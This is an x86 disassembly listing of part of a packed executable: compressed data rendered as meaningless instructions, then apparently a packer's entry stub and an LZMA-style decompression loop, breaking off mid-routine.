  539030:	jle    0x538fcc
  539032:	mov    esi,0xd5f7fbbb
  539037:	pushf  
  539038:	dec    ecx
  539039:	xchg   ecx,eax
  53903a:	pop    eax
  53903b:	test   al,0x9a
  53903d:	repnz das 
  53903f:	jp     0x5390b3
  539041:	mov    cl,0x9d
  539043:	setl   BYTE PTR [ebx+edi*2-0x438aaff7]
  53904b:	push   ecx
  53904c:	scas   al,BYTE PTR es:[edi]
  53904d:	pop    ebx
  53904e:	push   ecx
  53904f:	or     BYTE PTR [edx+0x490634e7],bh
  539055:	shl    ebp,cl
  539057:	add    DWORD PTR [eiz*1+0x704fa738],0xc554f113
  539062:	pushf  
  539063:	mov    eax,0x411816b
  539068:	ins    BYTE PTR es:[edi],dx
  539069:	add    al,0x35
  53906b:	jl     0x53909b
  53906d:	rcr    BYTE PTR [ecx-0x36],cl
  539070:	in     al,dx
  539071:	xchg   edx,eax
  539072:	fisub  DWORD PTR [eax]
  539074:	jnp    0x539034
  539076:	pop    esp
  539077:	add    BYTE PTR [edi+0x3c],cl
  53907a:	fs mov ch,0x9
  53907d:	mov    ch,0x86
  53907f:	(bad)  [ebx]
  539081:	test   al,0xb6
  539083:	js     0x5390b2
  539085:	int3   
  539086:	xor    ch,BYTE PTR [eax+edx*4+0x40a407c9]
  53908d:	sahf   
  53908e:	pop    ecx
  53908f:	dec    ebp
  539090:	jecxz  0x53903a
  539092:	push   es
  539093:	dec    edx
  539094:	inc    edi
  539095:	dec    eax
  539096:	fs jbe 0x5390cb
  539099:	test   esp,ebp
  53909b:	imul   esp,DWORD PTR [ebx-0x5d],0x5e
  53909f:	arpl   WORD PTR [ebp-0x161c0be5],sp
  5390a5:	cli    
  5390a6:	popf   
  5390a7:	push   eax
  5390a8:	dec    edx
  5390a9:	and    al,0x32
  5390ab:	add    ebp,ebp
  5390ad:	in     eax,dx
  5390ae:	sub    BYTE PTR [esi],ah
  5390b0:	je     0x5390cb
  5390b2:	adc    eax,0xa0678255
  5390b7:	sub    cl,dh
  5390b9:	cmp    eax,0xe5ef95ad
  5390be:	push   0x3237dbc9
  5390c3:	cmc    
  5390c4:	mov    eax,ds:0x85236a83
  5390c9:	push   es
  5390ca:	mov    ds:0xb6cf6ce1,eax
  5390cf:	repz jg 0x539083
  5390d2:	loop   0x53909a
	...
  5390e0:	pusha  
  5390e1:	mov    esi,0x50d000
  5390e6:	lea    edi,[esi-0x10c000]
  5390ec:	push   edi
  5390ed:	mov    ebp,esp
  5390ef:	lea    ebx,[esp-0x3e80]
  5390f6:	xor    eax,eax
  5390f8:	push   eax
  5390f9:	cmp    esp,ebx
  5390fb:	jne    0x5390f8
  5390fd:	inc    esi
  5390fe:	inc    esi
  5390ff:	push   ebx
  539100:	push   0x137696
  539105:	push   edi
  539106:	add    ebx,0x4
  539109:	push   ebx
  53910a:	push   0x2c0d3
  53910f:	push   esi
  539110:	add    ebx,0x4
  539113:	push   ebx
  539114:	push   eax
  539115:	mov    DWORD PTR [ebx],0x20003
  53911b:	nop
  53911c:	nop
  53911d:	nop
  53911e:	nop
  53911f:	nop
  539120:	push   ebp
  539121:	push   edi
  539122:	push   esi
  539123:	push   ebx
  539124:	sub    esp,0x7c
  539127:	mov    edx,DWORD PTR [esp+0x90]
  53912e:	mov    DWORD PTR [esp+0x74],0x0
  539136:	mov    BYTE PTR [esp+0x73],0x0
  53913b:	mov    ebp,DWORD PTR [esp+0x9c]
  539142:	lea    eax,[edx+0x4]
  539145:	mov    DWORD PTR [esp+0x78],eax
  539149:	mov    eax,0x1
  53914e:	movzx  ecx,BYTE PTR [edx+0x2]
  539152:	mov    ebx,eax
  539154:	shl    ebx,cl
  539156:	mov    ecx,ebx
  539158:	dec    ecx
  539159:	mov    DWORD PTR [esp+0x6c],ecx
  53915d:	movzx  ecx,BYTE PTR [edx+0x1]
  539161:	shl    eax,cl
  539163:	dec    eax
  539164:	mov    DWORD PTR [esp+0x68],eax
  539168:	mov    eax,DWORD PTR [esp+0xa8]
  53916f:	movzx  esi,BYTE PTR [edx]
  539172:	mov    DWORD PTR [ebp+0x0],0x0
  539179:	mov    DWORD PTR [esp+0x60],0x0
  539181:	mov    DWORD PTR [eax],0x0
  539187:	mov    eax,0x300
  53918c:	mov    DWORD PTR [esp+0x64],esi
  539190:	mov    DWORD PTR [esp+0x5c],0x1
  539198:	mov    DWORD PTR [esp+0x58],0x1
  5391a0:	mov    DWORD PTR [esp+0x54],0x1
  5391a8:	mov    DWORD PTR [esp+0x50],0x1
  5391b0:	movzx  ecx,BYTE PTR [edx+0x1]
  5391b4:	add    ecx,esi
  5391b6:	shl    eax,cl
  5391b8:	lea    ecx,[eax+0x736]
  5391be:	cmp    DWORD PTR [esp+0x74],ecx
  5391c2:	jae    0x5391d2
  5391c4:	mov    eax,DWORD PTR [esp+0x78]
  5391c8:	mov    WORD PTR [eax],0x400
  5391cd:	add    eax,0x2
  5391d0:	loop   0x5391c8
  5391d2:	mov    ebx,DWORD PTR [esp+0x94]
  5391d9:	xor    edi,edi
  5391db:	mov    DWORD PTR [esp+0x48],0xffffffff
  5391e3:	mov    edx,ebx
  5391e5:	add    edx,DWORD PTR [esp+0x98]
  5391ec:	mov    DWORD PTR [esp+0x4c],edx
  5391f0:	xor    edx,edx
  5391f2:	cmp    ebx,DWORD PTR [esp+0x4c]
  5391f6:	je     0x539b78
  5391fc:	movzx  eax,BYTE PTR [ebx]
  5391ff:	shl    edi,0x8
  539202:	inc    edx
  539203:	inc    ebx
  539204:	or     edi,eax
  539206:	cmp    edx,0x4
  539209:	jle    0x5391f2
  53920b:	mov    ecx,DWORD PTR [esp+0xa4]
  539212:	cmp    DWORD PTR [esp+0x74],ecx
  539216:	jae    0x539b80
  53921c:	mov    esi,DWORD PTR [esp+0x74]
  539220:	and    esi,DWORD PTR [esp+0x6c]
  539224:	mov    eax,DWORD PTR [esp+0x60]
  539228:	mov    edx,DWORD PTR [esp+0x78]
  53922c:	shl    eax,0x4
  53922f:	mov    DWORD PTR [esp+0x44],esi
  539233:	add    eax,esi
  539235:	cmp    DWORD PTR [esp+0x48],0xffffff
  53923d:	lea    ebp,[edx+eax*2]
  539240:	ja     0x53925a
  539242:	cmp    ebx,DWORD PTR [esp+0x4c]
  539246:	je     0x539b78
  53924c:	shl    DWORD PTR [esp+0x48],0x8
  539251:	movzx  eax,BYTE PTR [ebx]
  539254:	shl    edi,0x8
  539257:	inc    ebx
  539258:	or     edi,eax
  53925a:	mov    eax,DWORD PTR [esp+0x48]
  53925e:	mov    dx,WORD PTR [ebp+0x0]
  539262:	shr    eax,0xb
  539265:	movzx  ecx,dx
  539268:	imul   eax,ecx
  53926b:	cmp    edi,eax
  53926d:	jae    0x539450
  539273:	mov    DWORD PTR [esp+0x48],eax
  539277:	mov    eax,0x800
  53927c:	sub    eax,ecx
  53927e:	mov    cl,BYTE PTR [esp+0x64]
  539282:	sar    eax,0x5
  539285:	mov    esi,0x1
  53928a:	lea    eax,[edx+eax*1]
  53928d:	movzx  edx,BYTE PTR [esp+0x73]
  539292:	mov    WORD PTR [ebp+0x0],ax
  539296:	mov    eax,DWORD PTR [esp+0x74]
  53929a:	and    eax,DWORD PTR [esp+0x68]
  53929e:	mov    ebp,DWORD PTR [esp+0x78]
  5392a2:	shl    eax,cl
  5392a4:	mov    ecx,0x8
  5392a9:	sub    ecx,DWORD PTR [esp+0x64]
  5392ad:	sar    edx,cl
  5392af:	add    eax,edx
  5392b1:	imul   eax,eax,0x600
  5392b7:	cmp    DWORD PTR [esp+0x60],0x6
  5392bc:	lea    eax,[ebp+eax*1+0xe6c]
  5392c3:	mov    DWORD PTR [esp+0x14],eax
  5392c7:	jle    0x539397
  5392cd:	mov    eax,DWORD PTR [esp+0x74]
  5392d1:	sub    eax,DWORD PTR [esp+0x5c]
  5392d5:	mov    edx,DWORD PTR [esp+0xa0]
  5392dc:	movzx  eax,BYTE PTR [edx+eax*1]
  5392e0:	mov    DWORD PTR [esp+0x40],eax
  5392e4:	shl    DWORD PTR [esp+0x40],1
  5392e8:	mov    ecx,DWORD PTR [esp+0x40]
  5392ec:	lea    edx,[esi+esi*1]
  5392ef:	mov    ebp,DWORD PTR [esp+0x14]
  5392f3:	and    ecx,0x100
  5392f9:	cmp    DWORD PTR [esp+0x48],0xffffff
  539301:	lea    eax,[ebp+ecx*2+0x0]
  539305:	mov    DWORD PTR [esp+0x3c],ecx
  539309:	lea    ebp,[eax+edx*1]
  53930c:	ja     0x539326
  53930e:	cmp    ebx,DWORD PTR [esp+0x4c]
  539312:	je     0x539b78
  539318:	shl    DWORD PTR [esp+0x48],0x8
  53931d:	movzx  eax,BYTE PTR [ebx]
  539320:	shl    edi,0x8
  539323:	inc    ebx
  539324:	or     edi,eax
  539326:	mov    eax,DWORD PTR [esp+0x48]
  53932a:	mov    cx,WORD PTR [ebp+0x200]
  539331:	shr    eax,0xb
  539334:	movzx  esi,cx
  539337:	imul   eax,esi
  53933a:	cmp    edi,eax
  53933c:	jae    0x539361
  53933e:	mov    DWORD PTR [esp+0x48],eax
  539342:	mov    eax,0x800
  539347:	sub    eax,esi
  539349:	mov    esi,edx
  53934b:	sar    eax,0x5
  53934e:	cmp    DWORD PTR [esp+0x3c],0x0
  539353:	lea    eax,[ecx+eax*1]
  539356:	mov    WORD PTR [ebp+0x200],ax
  53935d:	je     0x539381
  53935f:	jmp    0x53938f
  539361:	sub    DWORD PTR [esp+0x48],eax
  539365:	sub    edi,eax
  539367:	mov    eax,ecx
  539369:	lea    esi,[edx+0x1]
  53936c:	shr    ax,0x5
  539370:	sub    cx,ax
  539373:	cmp    DWORD PTR [esp+0x3c],0x0
  539378:	mov    WORD PTR [ebp+0x200],cx
  53937f:	je     0x53938f
  539381:	cmp    esi,0xff
  539387:	jle    0x5392e4
  53938d:	jmp    0x539408
  53938f:	cmp    esi,0xff
  539395:	jg     0x539408
  539397:	lea    edx,[esi+esi*1]
  53939a:	mov    ebp,DWORD PTR [esp+0x14]
  53939e:	add    ebp,edx
  5393a0:	cmp    DWORD PTR [esp+0x48],0xffffff
  5393a8:	ja     0x5393c2
  5393aa:	cmp    ebx,DWORD PTR [esp+0x4c]
  5393ae:	je     0x539b78
  5393b4:	shl    DWORD PTR [esp+0x48],0x8
  5393b9:	movzx  eax,BYTE PTR [ebx]
  5393bc:	shl    edi,0x8
  5393bf:	inc    ebx
  5393c0:	or     edi,eax
  5393c2:	mov    eax,DWORD PTR [esp+0x48]
  5393c6:	mov    cx,WORD PTR [ebp+0x0]
  5393ca:	shr    eax,0xb
  5393cd:	movzx  esi,cx
  5393d0:	imul   eax,esi
  5393d3:	cmp    edi,eax
  5393d5:	jae    0x5393f0
  5393d7:	mov    DWORD PTR [esp+0x48],eax
  5393db:	mov    eax,0x800
  5393e0:	sub    eax,esi
  5393e2:	mov    esi,edx
  5393e4:	sar    eax,0x5
  5393e7:	lea    eax,[ecx+eax*1]
  5393ea:	mov    WORD PTR [ebp+0x0],ax
  5393ee:	jmp    0x53938f
  5393f0:	sub    DWORD PTR [esp+0x48],eax
  5393f4:	sub    edi,eax
  5393f6:	mov    eax,ecx
  5393f8:	lea    esi,[edx+0x1]
  5393fb:	shr    ax,0x5
  5393ff:	sub    cx,ax
  539402:	mov    WORD PTR [ebp+0x0],cx
  539406:	jmp    0x53938f
  539408:	mov    edx,DWORD PTR [esp+0x74]
  53940c:	mov    eax,esi
  53940e:	mov    ecx,DWORD PTR [esp+0xa0]
  539415:	mov    BYTE PTR [esp+0x73],al
  539419:	mov    BYTE PTR [edx+ecx*1],al
  53941c:	inc    edx
  53941d:	cmp    DWORD PTR [esp+0x60],0x3
  539422:	mov    DWORD PTR [esp+0x74],edx
  539426:	jg     0x539435
  539428:	mov    DWORD PTR [esp+0x60],0x0
  539430:	jmp    0x539b50
  539435:	cmp    DWORD PTR [esp+0x60],0x9
  53943a:	jg     0x539446
  53943c:	sub    DWORD PTR [esp+0x60],0x3
  539441:	jmp    0x539b50
  539446:	sub    DWORD PTR [esp+0x60],0x6
  53944b:	jmp    0x539b50
  539450:	mov    ecx,DWORD PTR [esp+0x48]
  539454:	sub    edi,eax
  539456:	mov    esi,DWORD PTR [esp+0x60]
  53945a:	sub    ecx,eax
  53945c:	mov    eax,edx
  53945e:	shr    ax,0x5
  539462:	sub    dx,ax
  539465:	cmp    ecx,0xffffff
  53946b:	mov    WORD PTR [ebp+0x0],dx
  53946f:	mov    ebp,DWORD PTR [esp+0x78]
  539473:	lea    esi,[ebp+esi*2+0x0]
  539477:	mov    DWORD PTR [esp+0x38],esi
  53947b:	ja     0x539493
  53947d:	cmp    ebx,DWORD PTR [esp+0x4c]
  539481:	je     0x539b78
  539487:	movzx  eax,BYTE PTR [ebx]
  53948a:	shl    edi,0x8
  53948d:	shl    ecx,0x8
  539490:	inc    ebx
  539491:	or     edi,eax
  539493:	mov    ebp,DWORD PTR [esp+0x38]
  539497:	mov    eax,ecx
  539499:	shr    eax,0xb
  53949c:	mov    dx,WORD PTR [ebp+0x180]
  5394a3:	movzx  ebp,dx
  5394a6:	imul   eax,ebp
  5394a9:	cmp    edi,eax
  5394ab:	jae    0x5394ff
  5394ad:	mov    esi,eax
  5394af:	mov    eax,0x800
  5394b4:	sub    eax,ebp
  5394b6:	mov    ebp,DWORD PTR [esp+0x58]
  5394ba:	sar    eax,0x5
  5394bd:	mov    ecx,DWORD PTR [esp+0x54]
  5394c1:	lea    eax,[edx+eax*1]
  5394c4:	mov    edx,DWORD PTR [esp+0x38]
  5394c8:	mov    DWORD PTR [esp+0x50],ecx
  5394cc:	mov    ecx,DWORD PTR [esp+0x78]
  5394d0:	mov    WORD PTR [edx+0x180],ax
  5394d7:	mov    eax,DWORD PTR [esp+0x5c]
  5394db:	mov    DWORD PTR [esp+0x54],ebp
  5394df:	mov    DWORD PTR [esp+0x58],eax
  5394e3:	xor    eax,eax
  5394e5:	cmp    DWORD PTR [esp+0x60],0x6
  5394ea:	setg   al
  5394ed:	add    ecx,0x664
  5394f3:	lea    eax,[eax+eax*2]
  5394f6:	mov    DWORD PTR [esp+0x60],eax
  5394fa:	jmp    0x539773
  5394ff:	mov    esi,ecx
  539501:	sub    edi,eax
  539503:	sub    esi,eax
  539505:	mov    eax,edx
  539507:	shr    ax,0x5
  53950b:	mov    ecx,DWORD PTR [esp+0x38]
  53950f:	sub    dx,ax
  539512:	cmp    esi,0xffffff
  539518:	mov    WORD PTR [ecx+0x180],dx
  53951f:	ja     0x539537
  539521:	cmp    ebx,DWORD PTR [esp+0x4c]
  539525:	je     0x539b78
  53952b:	movzx  eax,BYTE PTR [ebx]
  53952e:	shl    edi,0x8
  539531:	shl    esi,0x8
  539534:	inc    ebx
  539535:	or     edi,eax
  539537:	mov    ebp,DWORD PTR [esp+0x38]
  53953b:	mov    edx,esi
  53953d:	shr    edx,0xb
  539540:	mov    cx,WORD PTR [ebp+0x198]
  539547:	movzx  eax,cx
  53954a:	imul   edx,eax
  53954d:	cmp    edi,edx
  53954f:	jae    0x539638
  539555:	mov    ebp,0x800
  53955a:	mov    esi,edx
  53955c:	sub    ebp,eax
  53955e:	mov    DWORD PTR [esp+0x34],0x800
  539566:	mov    eax,ebp
  539568:	sar    eax,0x5
  53956b:	lea    eax,[ecx+eax*1]
  53956e:	mov    ecx,DWORD PTR [esp+0x38]
  539572:	mov    WORD PTR [ecx+0x198],ax
  539579:	mov    eax,DWORD PTR [esp+0x60]
  53957d:	mov    ecx,DWORD PTR [esp+0x44]
  539581:	shl    eax,0x5
  539584:	add    eax,DWORD PTR [esp+0x78]
  539588:	cmp    edx,0xffffff
  53958e:	lea    ebp,[eax+ecx*2]
  539591:	ja     0x5395a9
  539593:	cmp    ebx,DWORD PTR [esp+0x4c]
  539597:	je     0x539b78
  53959d:	movzx  eax,BYTE PTR [ebx]
  5395a0:	shl    edi,0x8
  5395a3:	shl    esi,0x8
  5395a6:	inc    ebx
  5395a7:	or     edi,eax
  5395a9:	mov    dx,WORD PTR [ebp+0x1e0]
  5395b0:	mov    eax,esi
  5395b2:	shr    eax,0xb
  5395b5:	movzx  ecx,dx
  5395b8:	imul   eax,ecx
  5395bb:	cmp    edi,eax
  5395bd:	jae    0x53961f
  5395bf:	sub    DWORD PTR [esp+0x34],ecx
  5395c3:	sar    DWORD PTR [esp+0x34],0x5
  5395c8:	mov    esi,DWORD PTR [esp+0x34]
  5395cc:	mov    DWORD PTR [esp+0x48],eax
  5395d0:	cmp    DWORD PTR [esp+0x74],0x0
  5395d5:	lea    eax,[edx+esi*1]
  5395d8:	mov    WORD PTR [ebp+0x1e0],ax
  5395df:	je     0x539b78
  5395e5:	xor    eax,eax
  5395e7:	cmp    DWORD PTR [esp+0x60],0x6
  5395ec:	mov    ebp,DWORD PTR [esp+0xa0]
  5395f3:	mov    edx,DWORD PTR [esp+0x74]
  5395f7:	setg   al
  5395fa:	lea    eax,[eax+eax*1+0x9]
  5395fe:	mov    DWORD PTR [esp+0x60],eax
  539602:	mov    eax,DWORD PTR [esp+0x74]
  539606:	sub    eax,DWORD PTR [esp+0x5c]
  53960a:	mov    al,BYTE PTR [ebp+eax*1+0x0]
  53960e:	mov    BYTE PTR [esp+0x73],al
  539612:	mov    BYTE PTR [edx+ebp*1],al
  539615:	inc    edx
  539616:	mov    DWORD PTR [esp+0x74],edx
  53961a:	jmp    0x539b50
  53961f:	sub    esi,eax
  539621:	sub    edi,eax
  539623:	mov    eax,edx
  539625:	shr    ax,0x5
  539629:	sub    dx,ax
  53962c:	mov    WORD PTR [ebp+0x1e0],dx
  539633:	jmp    0x539757
  539638:	mov    eax,ecx
  53963a:	sub    esi,edx
  53963c:	shr    ax,0x5
  539640:	mov    ebp,DWORD PTR [esp+0x38]
  539644:	sub    cx,ax
  539647:	sub    edi,edx
  539649:	cmp    esi,0xffffff
  53964f:	mov    WORD PTR [ebp+0x198],cx
  539656:	ja     0x53966e
  539658:	cmp    ebx,DWORD PTR [esp+0x4c]
  53965c:	je     0x539b78
  539662:	movzx  eax,BYTE PTR [ebx]
  539665:	shl    edi,0x8
  539668:	shl    esi,0x8
  53966b:	inc    ebx
  53966c:	or     edi,eax
  53966e:	mov    ecx,DWORD PTR [esp+0x38]
  539672:	mov    eax,esi
  539674:	shr    eax,0xb
  539677:	mov    dx,WORD PTR [ecx+0x1b0]
  53967e:	movzx  ecx,dx
  539681:	imul   eax,ecx
  539684:	cmp    edi,eax
  539686:	jae    0x5396ab
  539688:	mov    esi,eax
  53968a:	mov    eax,0x800
  53968f:	sub    eax,ecx
  539691:	mov    ebp,DWORD PTR [esp+0x38]
  539695:	sar    eax,0x5
  539698:	lea    eax,[edx+eax*1]
  53969b:	mov    WORD PTR [ebp+0x1b0],ax
  5396a2:	mov    eax,DWORD PTR [esp+0x58]
  5396a6:	jmp    0x53974b
  5396ab:	mov    ecx,esi
  5396ad:	sub    edi,eax
  5396af:	sub    ecx,eax
  5396b1:	mov    eax,edx
  5396b3:	shr    ax,0x5
  5396b7:	sub    dx,ax
  5396ba:	mov    eax,DWORD PTR [esp+0x38]
  5396be:	cmp    ecx,0xffffff
  5396c4:	mov    WORD PTR [eax+0x1b0],dx
  5396cb:	ja     0x5396e3
  5396cd:	cmp    ebx,DWORD PTR [esp+0x4c]
  5396d1:	je     0x539b78
  5396d7:	movzx  eax,BYTE PTR [ebx]
  5396da:	shl    edi,0x8
  5396dd:	shl    ecx,0x8
  5396e0:	inc    ebx
  5396e1:	or     edi,eax
  5396e3:	mov    esi,DWORD PTR [esp+0x38]
  5396e7:	mov    eax,ecx
  5396e9:	shr    eax,0xb
  5396ec:	mov    dx,WORD PTR [esi+0x1c8]
  5396f3:	movzx  ebp,dx
  5396f6:	imul   eax,ebp
  5396f9:	cmp    edi,eax
  5396fb:	jae    0x53971d
  5396fd:	mov    esi,eax
  5396ff:	mov    eax,0x800
  539704:	sub    eax,ebp
  539706:	mov    ebp,DWORD PTR [esp+0x38]
  53970a:	sar    eax,0x5
  53970d:	lea    eax,[edx+eax*1]
  539710:	mov    WORD PTR [ebp+0x1c8],ax
  539717:	mov    eax,DWORD PTR [esp+0x54]
  53971b:	jmp    0x539743
  53971d:	mov    esi,ecx
  53971f:	sub    edi,eax
  539721:	sub    esi,eax
  539723:	mov    eax,edx
  539725:	shr    ax,0x5
  539729:	sub    dx,ax
  53972c:	mov    eax,DWORD PTR [esp+0x38]
  539730:	mov    WORD PTR [eax+0x1c8],dx
  539737:	mov    edx,DWORD PTR [esp+0x54]
  53973b:	mov    eax,DWORD PTR [esp+0x50]
  53973f:	mov    DWORD PTR [esp+0x50],edx
  539743:	mov    ecx,DWORD PTR [esp+0x58]
  539747:	mov    DWORD PTR [esp+0x54],ecx
  53974b:	mov    ebp,DWORD PTR [esp+0x5c]
  53974f:	mov    DWORD PTR [esp+0x5c],eax
  539753:	mov    DWORD PTR [esp+0x58],ebp
  539757:	xor    eax,eax
  539759:	cmp    DWORD PTR [esp+0x60],0x6
  53975e:	mov    ecx,DWORD PTR [esp+0x78]
  539762:	setg   al
  539765:	add    ecx,0xa68
  53976b:	lea    eax,[eax+eax*2+0x8]
  53976f:	mov    DWORD PTR [esp+0x60],eax
  539773:	cmp    esi,0xffffff
  539779:	ja     0x539791
  53977b:	cmp    ebx,DWORD PTR [esp+0x4c]
  53977f:	je     0x539b78
  539785:	movzx  eax,BYTE PTR [ebx]
  539788:	shl    edi,0x8
  53978b:	shl    esi,0x8
  53978e:	inc    ebx
  53978f:	or     edi,eax
  539791:	mov    dx,WORD PTR [ecx]
  539794:	mov    eax,esi
  539796:	shr    eax,0xb
  539799:	movzx  ebp,dx
  53979c:	imul   eax,ebp
  53979f:	cmp    edi,eax
  5397a1:	jae    0x5397d2
  5397a3:	mov    DWORD PTR [esp+0x48],eax
  5397a7:	mov    eax,0x800
  5397ac:	sub    eax,ebp
  5397ae:	shl    DWORD PTR [esp+0x44],0x4
  5397b3:	sar    eax,0x5
  5397b6:	mov    DWORD PTR [esp+0x2c],0x0
  5397be:	lea    eax,[edx+eax*1]
  5397c1:	mov    WORD PTR [ecx],ax
  5397c4:	mov    eax,DWORD PTR [esp+0x44]
  5397c8:	lea    ecx,[ecx+eax*1+0x4]
  5397cc:	mov    DWORD PTR [esp+0x10],ecx
  5397d0:	jmp    0x539844
  5397d2:	sub    esi,eax
  5397d4:	sub    edi,eax
  5397d6:	mov    eax,edx
  5397d8:	shr    ax,0x5
  5397dc:	sub    dx,ax
  5397df:	cmp    esi,0xffffff
  5397e5:	mov    WORD PTR [ecx],dx
  5397e8:	ja     0x539800
  5397ea:	cmp    ebx,DWORD PTR [esp+0x4c]
  5397ee:	je     0x539b78
  5397f4:	movzx  eax,BYTE PTR [ebx]
  5397f7:	shl    edi,0x8
  5397fa:	shl    esi,0x8
  5397fd:	inc    ebx
  5397fe:	or     edi,eax
  539800:	mov    dx,WORD PTR [ecx+0x2]
  539804:	mov    eax,esi
  539806:	shr    eax,0xb
  539809:	movzx  ebp,dx
  53980c:	imul   eax,ebp
  53980f:	cmp    edi,eax
  539811:	jae    0x53984e
  539813:	mov    DWORD PTR [esp+0x48],eax
  539817:	mov    eax,0x800
  53981c:	sub    eax,ebp
  53981e:	shl    DWORD PTR [esp+0x44],0x4
  539823:	sar    eax,0x5
  539826:	mov    DWORD PTR [esp+0x2c],0x8
  53982e:	lea    eax,[edx+eax*1]
  539831:	mov    edx,DWORD PTR [esp+0x44]
  539835:	mov    WORD PTR [ecx+0x2],ax
  539839:	lea    ecx,[ecx+edx*1+0x104]
  539840:	mov    DWORD PTR [esp+0x10],ecx
  539844:	mov    DWORD PTR [esp+0x30],0x3
  53984c:	jmp    0x53987d
  53984e:	sub    esi,eax
  539850:	sub    edi,eax
  539852:	mov    eax,edx
  539854:	mov    DWORD PTR [esp+0x48],esi
  539858:	shr    ax,0x5
  53985c:	mov    DWORD PTR [esp+0x2c],0x10
  539864:	sub    dx,ax
  539867:	mov    DWORD PTR [esp+0x30],0x8
  53986f:	mov    WORD PTR [ecx+0x2],dx
  539873:	add    ecx,0x204
  539879:	mov    DWORD PTR [esp+0x10],ecx
  53987d:	mov    ecx,DWORD PTR [esp+0x30]
  539881:	mov    edx,0x1
  539886:	mov    DWORD PTR [esp+0x28],ecx
  53988a:	lea    ebp,[edx+edx*1]
  53988d:	mov    esi,DWORD PTR [esp+0x10]
  539891:	add    esi,ebp
  539893:	cmp    DWORD PTR [esp+0x48],0xffffff
  53989b:	ja     0x5398b5
  53989d:	cmp    ebx,DWORD PTR [esp+0x4c]
  5398a1:	je     0x539b78
  5398a7:	shl    DWORD PTR [esp+0x48],0x8
  5398ac:	movzx  eax,BYTE PTR [ebx]
  5398af:	shl    edi,0x8
  5398b2:	inc    ebx
  5398b3:	or     edi,eax
  5398b5:	mov    eax,DWORD PTR [esp+0x48]
  5398b9:	mov    dx,WORD PTR [esi]
  5398bc:	shr    eax,0xb
  5398bf:	movzx  ecx,dx
  5398c2:	imul   eax,ecx
  5398c5:	cmp    edi,eax
  5398c7:	jae    0x5398e1
  5398c9:	mov    DWORD PTR [esp+0x48],eax
  5398cd:	mov    eax,0x800
  5398d2:	sub    eax,ecx
  5398d4:	sar    eax,0x5
  5398d7:	lea    eax,[edx+eax*1]
  5398da:	mov    edx,ebp
  5398dc:	mov    WORD PTR [esi],ax
  5398df:	jmp    0x5398f6
  5398e1:	sub    DWORD PTR [esp+0x48],eax
  5398e5:	sub    edi,eax
  5398e7:	mov    eax,edx
  5398e9:	shr    ax,0x5
  5398ed:	sub    dx,ax
  5398f0:	mov    WORD PTR [esi],dx
  5398f3:	lea    edx,[ebp+0x1]
  5398f6:	mov    esi,DWORD PTR [esp+0x28]
  5398fa:	dec    esi
  5398fb:	mov    DWORD PTR [esp+0x28],esi
  5398ff:	jne    0x53988a
  539901:	mov    cl,BYTE PTR [esp+0x30]
  539905:	mov    eax,0x1
  53990a:	shl    eax,cl
  53990c:	sub    edx,eax
  53990e:	add    edx,DWORD PTR [esp+0x2c]
  539912:	cmp    DWORD PTR [esp+0x60],0x3
  539917:	mov    DWORD PTR [esp+0xc],edx
  53991b:	jg     0x539b08
  539921:	add    DWORD PTR [esp+0x60],0x7
  539926:	cmp    edx,0x3
  539929:	mov    eax,edx
  53992b:	jle    0x539932
  53992d:	mov    eax,0x3
  539932:	mov    esi,DWORD PTR [esp+0x78]
  539936:	shl    eax,0x7
  539939:	mov    DWORD PTR [esp+0x24],0x6
  539941:	lea    eax,[esi+eax*1+0x360]
  539948:	mov    DWORD PTR [esp+0x8],eax
  53994c:	mov    eax,0x1
  539951:	lea    ebp,[eax+eax*1]
  539954:	mov    esi,DWORD PTR [esp+0x8]
  539958:	add    esi,ebp
  53995a:	cmp    DWORD PTR [esp+0x48],0xffffff
  539962:	ja     0x53997c
  539964:	cmp    ebx,DWORD PTR [esp+0x4c]
  539968:	je     0x539b78
  53996e:	shl    DWORD PTR [esp+0x48],0x8
  539973:	movzx  eax,BYTE PTR [ebx]
  539976:	shl    edi,0x8
  539979:	inc    ebx
  53997a:	or     edi,eax
  53997c:	mov    eax,DWORD PTR [esp+0x48]
  539980:	mov    dx,WORD PTR [esi]
  539983:	shr    eax,0xb
  539986:	movzx  ecx,dx
  539989:	imul   eax,ecx
  53998c:	cmp    edi,eax
  53998e:	jae    0x5399a8
  539990:	mov    DWORD PTR [esp+0x48],eax
  539994:	mov    eax,0x800
  539999:	sub    eax,ecx
  53999b:	sar    eax,0x5
  53999e:	lea    eax,[edx+eax*1]
  5399a1:	mov    WORD PTR [esi],ax
  5399a4:	mov    eax,ebp
  5399a6:	jmp    0x5399bd
  5399a8:	sub    DWORD PTR [esp+0x48],eax
  5399ac:	sub    edi,eax
  5399ae:	mov    eax,edx
  5399b0:	shr    ax,0x5
  5399b4:	sub    dx,ax
  5399b7:	lea    eax,[ebp+0x1]
  5399ba:	mov    WORD PTR [esi],dx
  5399bd:	mov    ebp,DWORD PTR [esp+0x24]
  5399c1:	dec    ebp
  5399c2:	mov    DWORD PTR [esp+0x24],ebp
  5399c6:	jne    0x539951
  5399c8:	lea    edx,[eax-0x40]
  5399cb:	cmp    edx,0x3
  5399ce:	mov    DWORD PTR [esp],edx
  5399d1:	jle    0x539afe
  5399d7:	mov    eax,edx
  5399d9:	mov    esi,edx
  5399db:	sar    eax,1
  5399dd:	and    esi,0x1
  5399e0:	lea    ecx,[eax-0x1]
  5399e3:	or     esi,0x2
  5399e6:	cmp    edx,0xd
  5399e9:	mov    DWORD PTR [esp+0x20],ecx
  5399ed:	jg     0x539a0b
  5399ef:	mov    ebp,DWORD PTR [esp+0x78]
  5399f3:	shl    esi,cl
  5399f5:	add    edx,edx
  5399f7:	mov    DWORD PTR [esp],esi
  5399fa:	lea    eax,[ebp+esi*2+0x0]
  5399fe:	sub    eax,edx
  539a00:	add    eax,0x55e
  539a05:	mov    DWORD PTR [esp+0x4],eax
  539a09:	jmp    0x539a61
  539a0b:	lea    edx,[eax-0x5]
  539a0e:	cmp    DWORD PTR [esp+0x48],0xffffff
  539a16:	ja     0x539a30
  539a18:	cmp    ebx,DWORD PTR [esp+0x4c]
  539a1c:	je     0x539b78
  539a22:	shl    DWORD PTR [esp+0x48],0x8
  539a27:	movzx  eax,BYTE PTR [ebx]
  539a2a:	shl    edi,0x8
  539a2d:	inc    ebx
  539a2e:	or     edi,eax
  539a30:	shr    DWORD PTR [esp+0x48],1
  539a34:	add    esi,esi
  539a36:	cmp    edi,DWORD PTR [esp+0x48]
  539a3a:	jb     0x539a43
  539a3c:	sub    edi,DWORD PTR [esp+0x48]
  539a40:	or     esi,0x1
  539a43:	dec    edx
  539a44:	jne    0x539a0e
  539a46:	mov    eax,DWORD PTR [esp+0x78]
